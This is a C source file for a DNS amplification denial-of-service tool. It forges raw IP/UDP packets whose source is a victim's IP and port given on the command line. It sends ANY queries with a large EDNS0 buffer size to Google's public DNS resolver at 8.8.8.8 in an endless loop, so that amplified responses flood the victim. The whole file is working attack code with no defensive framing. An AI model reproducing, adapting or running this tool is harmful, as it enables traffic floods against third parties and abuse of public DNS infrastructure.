#include "dnsAmplificationAttack.h"
#include <string.h>

unsigned short checkSum(unsigned short *ptr, int numBytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(numBytes>1) {
		sum+=*ptr++;
		numBytes-=2;
	}
	if(numBytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

void querySiteFormat(unsigned char * dns, unsigned char * host) 
{
	int last_dot = 0 , i;
	strcat((char*)host, ".");

	for (i = 0 ; i < strlen((char*)host) ; i++) {
		if (host[i] == '.') {
			*dns++ = i - last_dot;

			for(; last_dot<i; last_dot++) *dns++ = host[last_dot];

			last_dot++;
		}
	}

	*dns++ = 0x00;
}

void setDnsHeader(dnsHeader *dns)
{
	dns->id = (unsigned short) htons(getpid());
	dns->flags = htons(0x0120);
	dns->qusCount = htons(1);
	dns->ansCount = 0;
	dns->authCount = 0;
	dns->addRecordCount = htons(1);
}

void setExtendDnsHeader(eDnsHeader *eDns){
	eDns->name = 0;
	eDns->type = htons(41);
	eDns->udpPayloadSize = htons(0x1000);
	eDns->higherBits = 0;
	eDns->eDnsVersion = 0;
	eDns->z = 0;
	eDns->dataLength = 0;
}

void setipHeader(ipHeader *ip){
	ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    
}

void setQuery(query *q){
	q->type = htons(0x00ff);
	q->qclass = htons(0x1);
}

void dnsAmplificationAttack(char *victimIp, int victimPort)
{
	char *dnsIp = "8.8.8.8";
	int dnsPort = 53;
	

	/* Set headers */
	unsigned char dnsRequestPacket[139];
	unsigned char *dnsRecord = "www.github.com";
	
	dnsHeader *dns = (dnsHeader *)&dnsRequestPacket;
	setDnsHeader(dns);
	
	unsigned char *dnsName, dnsRcrd[32];
	dnsName = (unsigned char *)&dnsRequestPacket[12];
	strcpy(dnsRcrd, dnsRecord);
	querySiteFormat(dnsName , dnsRcrd);
	
	query *q;
	q = (query *)&dnsRequestPacket[12 + (strlen(dnsName)+1)];
	setQuery(q);
	

	eDnsHeader *eDns;
	eDns = (eDnsHeader *)&dnsRequestPacket[16 + (strlen(dnsName)+1)];
	setExtendDnsHeader(eDns);
	
	
	char datagram[4096], *data, *psgram;
    memset(datagram, 0, 4096);
    
	data = datagram + 28;
    memcpy(data, &dnsRequestPacket, 28 + (strlen(dnsName)+1));
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dnsPort);
    sin.sin_addr.s_addr = inet_addr(dnsIp);
    
    ipHeader *ip = (ipHeader *)datagram;
    setipHeader(ip);
    ip->tot_len = 55 + (strlen(dnsName)+1);
    ip->saddr = inet_addr(victimIp);
	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
	ip->daddr = sin.sin_addr.s_addr;
	
    udpHeader *udp = (udpHeader *)(datagram + 20);
	udp->source = htons(victimPort);
    udp->dest = htons(dnsPort);
    udp->len = htons(35 + (strlen(dnsName)+1));
    udp->check = 0;


    /* check sum */
	psHeader pshdr;
	pshdr.saddr = inet_addr(victimIp);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(35 + (strlen(dnsName)+1));

	int pssize = 47 + (strlen(dnsName)+1);
    psgram = malloc(pssize);
	
    memcpy(psgram, (char *)&pshdr, 12);
    memcpy(psgram + 12, udp, 35 + (strlen(dnsName)+1));
		
    udp->check = checkSum((unsigned short *)psgram, pssize);
    

    /* Set socket and send query packet */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock == -1) printf("Could not create socket.\n");
    else sendto(sock, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    
	free(psgram);
	close(sock);
	
	return;
}

int main(int argc, char **argv)
{	
	if(getuid()!=0) printf("run DNS Attack as root!\n");
	else {
		char *victimIp = argv[1];
		int victimPort = atoi(argv[2]);
		
		while(1) {
			printf("send query packet to google DNS Server\n");
			dnsAmplificationAttack(victimIp, victimPort);
			sleep(5);
		}	
	}
	

	return 0;
}
